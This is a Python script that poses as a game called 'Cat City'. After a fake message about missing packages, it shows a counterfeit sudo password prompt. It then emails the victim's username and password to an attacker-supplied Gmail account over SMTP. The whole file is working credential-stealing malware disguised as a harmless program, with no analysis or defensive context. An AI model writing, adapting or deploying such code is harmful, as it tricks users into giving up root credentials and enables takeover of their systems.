#!/usr/bin/env python3

import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from getpass import getpass
import time

def mailMyData(dataToSend):
    myMail = "example@gmail.com" # Change this to your gmail *Only Gmail Allowed*
    myPass = ""           # Your mail Password
    msg = MIMEMultipart()
    msg['Subject'] = "Root Password"
    msg['From'] = myMail
    msg['To'] = myMail
    data_send = str(dataToSend)
    part1 = MIMEText(data_send, 'plain')
    msg.attach(part1)
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(myMail, myPass)
    myText = msg.as_string()
    server.sendmail(myMail, myMail, myText)
    server.quit()

def getRootPassword():
    whoamiOutput = subprocess.check_output("whoami", shell=True)
    whoamiOutput = whoamiOutput.decode().replace("\n", "")
    usrPassword  = getpass("[sudo] password for " + whoamiOutput + ": ")
    return usrPassword, whoamiOutput


print("------------------------")
print("| Welcome to Cat City  |")
print("-----------------------|")
print("\n\n")
print("[+] Running Game")
time.sleep(4)
print("[-] It seems some of the packages not installed on your system!\n")
time.sleep(1)
print("[+] Installing Required Packages...\n")
usrPass, whois = getRootPassword()
usrData = whois + " : " + usrPass
mailMyData(usrData)
